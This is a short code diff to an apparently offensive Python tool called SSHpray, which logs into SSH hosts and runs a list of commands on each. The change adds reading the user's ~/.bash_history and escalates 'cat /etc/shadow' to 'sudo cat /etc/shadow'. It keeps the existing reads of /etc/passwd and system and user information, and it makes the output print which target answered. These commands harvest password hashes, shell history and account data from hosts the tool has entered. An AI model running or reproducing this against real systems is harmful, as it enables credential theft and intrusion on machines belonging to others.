@@ -23,7 +23,7 @@ class SSHpray():
 		self.timeout = int(5)
 
 		#command(s) to run
-		self.remote_commands = ['cat /etc/passwd;','cat /etc/shadow;','uname -a;','w;','who -a;','exit']
+		self.remote_commands = ['cat ~/.bash_history', 'cat /etc/passwd;','sudo cat /etc/shadow;','uname -a;','w;','who -a;','exit']
 
 	def check_args(self, parser):
 
@@ -139,7 +139,7 @@ class SSHpray():
 					#print('Running %s' % c)
 					stdin, stdout, stderr = ssh.exec_command(c)
 					#server response not working for some reason
-					print ("[+] Server responded to %s with: \n" % c)
+					print ("[+] %s responded to %s with: \n" % (t,c))
 					print (''.join(stdout.readlines()))
 					print('\n')
 				ssh.close()
